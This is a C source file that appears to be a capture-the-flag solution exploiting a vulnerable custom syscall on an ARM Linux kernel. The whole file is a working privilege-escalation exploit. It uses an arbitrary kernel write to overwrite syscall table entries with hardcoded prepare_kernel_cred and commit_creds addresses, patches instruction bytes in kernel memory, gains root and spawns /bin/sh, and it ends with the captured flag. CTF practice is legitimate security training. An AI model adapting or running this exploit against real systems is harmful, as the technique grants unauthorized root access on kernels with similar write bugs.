#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define SYS_UPPER 223

#define PREPARE_KERNEL_CREDS 0x8003f924
#define PREPARE_KERNEL_CREDS_STR "\x24\xf9\x03\x80"
#define COMMIT_CREDS         0x8003f56c
#define COMMIT_CREDS_STR     "\x6c\xf5\x03\x80"

#define SYS_CALL_TABLE		 0x8000e348	

#define UNIMPLEMENTED_SYSCALL1 285
#define UNIMPLEMENTED_SYSCALL2 222

unsigned int** sct;

int main(int argc, char *argv[])
{
    sct = (unsigned int**)SYS_CALL_TABLE;


    // replace this syscall with prepare_kernel_creds
    printf("UNIMPLEMENTED_SYSCALL1(0) = %p\n\n",syscall(UNIMPLEMENTED_SYSCALL1, 0));
    syscall(SYS_UPPER, PREPARE_KERNEL_CREDS_STR, sct + UNIMPLEMENTED_SYSCALL1);
    printf("UNIMPLEMENTED_SYSCALL1(0) = %p\n\n",syscall(UNIMPLEMENTED_SYSCALL1, 0));


    printf("UNIMPLEMENTED_SYSCALL2(syscall(UNIMPLEMENTED_SYSCALL1, 0)) = %p\n\n",syscall(UNIMPLEMENTED_SYSCALL2, syscall(UNIMPLEMENTED_SYSCALL1, 0)));


    // the address of commit_creds has an uppercase letter, so we have to fill the 0x20 perceeding bytes with a meaningless instruction, in this case moving a radnom number into r0
    syscall(SYS_UPPER, "\xe3\x02\x07\x0f\xe3\x02\x07\x0f\xe3\x02\x07\x0f\xe3\x02\x07\x0f\xe3\x02\x07\x0f\xe3\x02\x07\x0f\xe3\x02\x07\x0f\xe3\x02\x07\x0f", COMMIT_CREDS - 0x20);


    // replace this syscall with commit_creds and call it with prepare_kernel_creds(0)
    printf("geteuid(): %d\n", geteuid());
    syscall(SYS_UPPER, COMMIT_CREDS_STR, sct + UNIMPLEMENTED_SYSCALL2);
    printf("UNIMPLEMENTED_SYSCALL2(syscall(UNIMPLEMENTED_SYSCALL1, 0)) = %p\n\n",
        syscall(UNIMPLEMENTED_SYSCALL2, syscall(UNIMPLEMENTED_SYSCALL1, 0)));


    printf("geteuid(): %d\n", geteuid());
    system("/bin/sh");
    return 0;
}

// flag: Congratz!! addr_limit looks quite IMPORTANT now... huh?
